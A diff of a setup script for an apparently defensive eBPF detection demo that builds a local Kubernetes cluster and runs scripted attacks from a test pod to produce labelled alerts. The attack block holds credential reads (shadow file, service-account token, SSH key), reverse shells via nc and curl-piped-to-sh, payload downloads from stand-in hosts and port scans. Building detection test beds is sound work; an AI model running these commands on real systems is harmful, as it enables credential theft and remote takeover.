@@ -14,7 +14,7 @@ echo "============================================================"
 mkdir -p bin
 export PATH="$PWD/bin:$PATH"
 
-echo "[1/6] Checking tooling dependencies..."
+echo "[1/9] Checking tooling dependencies..."
 if ! docker ps &>/dev/null; then
     echo "  ✖ Error: Docker is not running or accessible. Please start Docker first."
     exit 1
@@ -44,7 +44,7 @@ CLUSTER_NAME="sentinel-cluster"
 
 # ── 2. Kubernetes Cluster ────────────────────────────────────────
 echo ""
-echo "[2/6] Provisioning Kubernetes cluster..."
+echo "[2/9] Provisioning Kubernetes cluster..."
 
 mkdir -p /tmp
 if kind get clusters 2>/dev/null | grep -q "^${CLUSTER_NAME}$"; then
@@ -93,7 +93,7 @@ docker exec ${CLUSTER_NAME}-control-plane \
 
 # ── 3. Tetragon eBPF Agent ───────────────────────────────────────
 echo ""
-echo "[3/6] Deploying Tetragon eBPF agent..."
+echo "[3/9] Deploying Tetragon eBPF agent..."
 if helm list -n kube-system 2>/dev/null | grep -q tetragon; then
     echo "  ✓ Tetragon already installed"
 else
@@ -115,7 +115,7 @@ echo "  ✓ Tetragon is LIVE and monitoring"
 
 # ── 4. Deploy Real Attack Pod ────────────────────────────────────
 echo ""
-echo "[4/6] Deploying attacker workload into cluster..."
+echo "[4/9] Deploying attacker workload into cluster..."
 kubectl delete pod attacker-pod --ignore-not-found=true >/dev/null 2>&1
 kubectl run attacker-pod \
     --image=alpine/curl:latest \
@@ -127,22 +127,76 @@ echo "  ✓ Attacker pod is LIVE in namespace: default"
 
 # ── 5. Execute Real Attacks ──────────────────────────────────────
 echo ""
-echo "[5/6] Executing REAL attack commands inside the cluster..."
-echo "  ↳ Attack 1: Downloading external payload via curl"
-kubectl exec attacker-pod -- curl -sk http://evil.example.com/payload.sh -o /dev/null 2>/dev/null || true
-echo "  ↳ Attack 2: Reading /etc/shadow (privilege escalation recon)"
-kubectl exec attacker-pod -- cat /etc/shadow 2>/dev/null || true
-echo "  ↳ Attack 3: Attempting reverse shell via nc"
-kubectl exec attacker-pod -- sh -c "nc -w1 10.0.0.99 4444 </dev/null" 2>/dev/null &
-echo "  ↳ Attack 4: Process enumeration"
-kubectl exec attacker-pod -- ps aux 2>/dev/null || true
-echo "  ↳ Attack 5: DNS exfiltration attempt"
-kubectl exec attacker-pod -- nslookup evil.example.com 2>/dev/null || true
-echo "  ✓ All attack commands executed in real cluster"
+echo "[5/9] Executing REAL attack commands inside the cluster..."
 
-# ── 6. Stream + Analyze ──────────────────────────────────────────
+# ── HIGH SEVERITY (TP-grade): shell parent + sensitive paths + network + high-risk binaries ──
+echo "  ↳ Attack 1: Credential theft via shell (shadow + passwd)"
+kubectl exec attacker-pod -- sh -c "cat /etc/shadow" 2>/dev/null || true
+kubectl exec attacker-pod -- sh -c "cat /etc/passwd" 2>/dev/null || true
+
+echo "  ↳ Attack 2: Kubernetes secret exfiltration"
+kubectl exec attacker-pod -- sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token" 2>/dev/null || true
+kubectl exec attacker-pod -- sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" 2>/dev/null || true
+
+echo "  ↳ Attack 3: Reverse shell attempts with network targets"
+kubectl exec attacker-pod -- sh -c "nc -e /bin/sh 10.0.0.99 4444" 2>/dev/null &
+kubectl exec attacker-pod -- sh -c "curl http://10.0.0.99:8888/shell.sh | sh" 2>/dev/null &
+
+echo "  ↳ Attack 4: Download + execute remote payload"
+kubectl exec attacker-pod -- sh -c "curl -sk https://evil.example.com/payload.sh -o /tmp/payload.sh && chmod +x /tmp/payload.sh" 2>/dev/null || true
+kubectl exec attacker-pod -- sh -c "wget -q http://10.0.0.99:9090/backdoor -O /tmp/backdoor" 2>/dev/null || true
+
+echo "  ↳ Attack 5: Network port scanning"
+kubectl exec attacker-pod -- sh -c "nc -zw1 10.96.0.1 443" 2>/dev/null || true
+kubectl exec attacker-pod -- sh -c "nc -zw1 10.96.0.1 8443" 2>/dev/null || true
+kubectl exec attacker-pod -- sh -c "nc -zw1 10.96.0.10 53" 2>/dev/null || true
+
+echo "  ↳ Attack 6: SSH key theft + proc recon"
+kubectl exec attacker-pod -- sh -c "cat /root/.ssh/id_rsa" 2>/dev/null || true
+kubectl exec attacker-pod -- sh -c "ls -la /proc/1/root/" 2>/dev/null || true
+kubectl exec attacker-pod -- sh -c "find / -perm -4000 2>/dev/null | head -5" 2>/dev/null || true
+
+# ── MEDIUM SEVERITY (BP-grade): some risk signals but less critical ──
+echo "  ↳ Attack 7: Process + user enumeration"
+kubectl exec attacker-pod -- sh -c "ps aux && whoami && id" 2>/dev/null || true
+
+echo "  ↳ Attack 8: DNS exfiltration"
+kubectl exec attacker-pod -- sh -c "nslookup data.evil.example.com" 2>/dev/null || true
+kubectl exec attacker-pod -- sh -c "wget -q https://example.com -O /dev/null" 2>/dev/null || true
+
+# ── LOW SEVERITY (FP-grade): baseline normal activity ──
+echo "  ↳ Attack 9: Benign commands (baseline)"
+kubectl exec attacker-pod -- ls /tmp 2>/dev/null || true
+kubectl exec attacker-pod -- whoami 2>/dev/null || true
+
+echo "  ✓ All attack commands executed — mixed TP/BP/FP severity"
+
+# ── 6. Redis ─────────────────────────────────────────────────────
 echo ""
-echo "[6/6] Starting Sentinel-Core ML + RAG Pipeline..."
+echo "[6/9] Starting Redis on port 6379..."
+if docker ps --format '{{.Names}}' 2>/dev/null | grep -q '^sentinel-redis$'; then
+    echo "  ✓ Redis container already running"
+elif docker ps -a --format '{{.Names}}' 2>/dev/null | grep -q '^sentinel-redis$'; then
+    echo "  ↳ Restarting existing Redis container..."
+    docker start sentinel-redis >/dev/null
+    echo "  ✓ Redis container restarted"
+else
+    echo "  ↳ Starting Redis via Docker..."
+    docker run -d --name sentinel-redis -p 6379:6379 redis:7-alpine >/dev/null
+    echo "  ✓ Redis container started"
+fi
+# Wait for Redis to accept connections
+for i in $(seq 1 10); do
+    if docker exec sentinel-redis redis-cli ping 2>/dev/null | grep -q PONG; then
+        echo "  ✓ Redis is ready"
+        break
+    fi
+    sleep 1
+done
+
+# ── 7. Stream + Analyze ──────────────────────────────────────────
+echo ""
+echo "[7/9] Starting Sentinel-Core ML + RAG Pipeline..."
 export PYTHONPATH="$PWD:$PYTHONPATH"
 
 cat << 'PYEOF' > _sentinel_live.py
@@ -251,9 +305,9 @@ echo "============================================================"
 echo "  STREAM ACTIVE — Real eBPF events flowing"
 echo "============================================================"
 
-# ── 7. Start Dashboard API (port 8080) ───────────────────────────
+# ── 8. Start Dashboard API (port 8080) ───────────────────────────
 echo ""
-echo "[7/8] Starting Dashboard API on port 8080..."
+echo "[8/9] Starting Dashboard API on port 8080..."
 export REMEDIATION_DRY_RUN="${REMEDIATION_DRY_RUN:-false}"
 export REMEDIATION_AUTONOMY_MODE="${REMEDIATION_AUTONOMY_MODE:-autonomous}"
 export REMEDIATION_SIGKILL_THRESHOLD="${REMEDIATION_SIGKILL_THRESHOLD:-0.85}"
@@ -263,9 +317,9 @@ DASHBOARD_API_PID=$!
 echo "  ✓ Dashboard API PID: $DASHBOARD_API_PID"
 sleep 2
 
-# ── 8. Start Frontend Dashboard (port 5173) ──────────────────────
+# ── 9. Start Frontend Dashboard (port 5173) ──────────────────────
 echo ""
-echo "[8/8] Starting Frontend Dashboard on port 5173..."
+echo "[9/9] Starting Frontend Dashboard on port 5173..."
 if [ -f dashboard/package.json ]; then
     cd dashboard
     if [ ! -d node_modules ]; then
@@ -294,9 +348,16 @@ echo "  Streaming eBPF events from cluster..."
 echo "  Press Ctrl+C to stop all services"
 echo ""
 
+# Cleanup on exit
+cleanup() {
+    echo ""
+    echo "Shutting down Sentinel-Core services..."
+    kill $DASHBOARD_API_PID $FRONTEND_PID 2>/dev/null
+    docker stop sentinel-redis >/dev/null 2>&1 || true
+    exit 0
+}
+trap cleanup INT TERM
+
 # Start the eBPF event stream (this blocks)
 kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon \
     -c export-stdout -f --since=1m | python3 _sentinel_live.py
-
-# Cleanup on exit
-trap "kill $DASHBOARD_API_PID $FRONTEND_PID 2>/dev/null; exit 0" INT TERM
